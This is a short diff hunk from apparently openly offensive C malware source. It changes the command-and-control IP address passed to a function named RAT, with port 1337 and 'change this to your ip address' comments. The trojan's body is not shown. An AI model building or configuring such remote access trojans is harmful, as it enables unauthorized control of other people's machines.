@@ -339,7 +339,7 @@ void RAT(char* C2_Server, int C2_Port)
 
 int main (int argc, char **argv)
 {
-    char host[] = "192.168.75.100";     // change this to your ip address
+    char host[] = "192.168.17.10";     // change this to your ip address
     int port = 1337;                    // change this to your open port
     RAT(host, port);
 
